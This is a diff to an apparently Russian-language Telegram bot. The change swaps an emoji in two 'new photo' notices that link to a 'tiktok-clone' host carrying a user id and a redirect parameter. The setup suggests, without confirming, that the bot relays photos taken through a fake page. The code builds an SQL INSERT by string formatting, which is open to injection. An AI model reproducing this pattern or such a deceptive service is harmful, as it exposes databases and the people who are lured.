@@ -111,7 +111,7 @@ async def webhook(
 
 
 
-            message = await send_telegram_message(user_id=user_id, text=f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard)
+            message = await send_telegram_message(user_id=user_id, text=f"📸Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard)
 
          
             mycursor.execute("INSERT INTO kwork22_photo (url, photo_time, user_id, message_id, token)  VALUES ('{}', '{}', '{}', '{}', '{}')".format(photo_path, int(time.time()), int(user_id), message.message_id, str(token_1) ))
@@ -130,7 +130,7 @@ async def send_telegram_message(user_id, text, reply_markup):
 
 async def send_telegram_photo(user_id, photo, redirect_url):
     photo_path = await save_image(photo, "data/images")
-    message = await bot.send_photo(user_id, FSInputFile(photo_path), caption=f'🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}')
+    message = await bot.send_photo(user_id, FSInputFile(photo_path), caption=f'📸Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}')
 
     mydb = await connect()
     mycursor = mydb.cursor(buffered=True)
